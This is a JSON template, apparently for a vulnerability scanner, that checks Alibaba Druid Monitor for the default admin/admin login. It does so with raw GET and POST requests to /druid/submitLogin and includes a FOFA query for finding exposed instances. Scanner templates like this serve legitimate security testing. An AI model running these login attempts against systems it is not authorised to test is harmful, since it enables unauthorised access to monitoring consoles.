@@ -1,0 +1,218 @@
+{
+  "id": "druid-default-login",
+  "name": "Alibaba Druid Monitor Default Login",
+  "author": "pikpikcu,j4vaovo",
+  "severity": "HIGH",
+  "description": "Alibaba Druid Monitor default login information (admin/admin) was discovered.",
+  "tags": [
+    "druid",
+    "alibaba",
+    "default-login"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "flow": "http(1) \u0026\u0026 http(2)",
+  "searchQueries": {
+    "fofa": "title\u003d\"druid monitor\""
+  },
+  "variables": {
+    "password": [
+      "admin"
+    ],
+    "username": [
+      "admin"
+    ]
+  },
+  "variablesType": "pitchfork",
+  "cweId": "CWE-798",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /druid/submitLogin HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "all",
+          "values": [
+            "error"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    },
+    {
+      "stepId": "http_1",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /druid/submitLogin HTTP/1.1\nHost: {{Hostname}}\n\nloginUsername\u003d{{username}}\u0026loginPassword\u003d{{password}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "^success$"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "druid-default-login",
+    "info": {
+      "name": "Alibaba Druid Monitor Default Login",
+      "author": "pikpikcu,j4vaovo",
+      "severity": "high",
+      "description": "Alibaba Druid Monitor default login information (admin/admin) was discovered.",
+      "classification": {
+        "cwe_id": "CWE-798"
+      },
+      "metadata": {
+        "max_request": 2,
+        "fofa_query": "title\u003d\"druid monitor\""
+      },
+      "tags": "druid,alibaba,default-login"
+    },
+    "flow": "http(1) \u0026\u0026 http(2)",
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /druid/submitLogin HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "all",
+            "words": [
+              "error"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      },
+      {
+        "global_matchers": false,
+        "payloads": {
+          "username": [
+            "admin"
+          ],
+          "password": [
+            "admin"
+          ]
+        },
+        "attack": "pitchfork",
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /druid/submitLogin HTTP/1.1\nHost: {{Hostname}}\n\nloginUsername\u003d{{username}}\u0026loginPassword\u003d{{password}}\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          },
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "^success$"
+            ],
+            "group": 1,
+            "internal": true
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
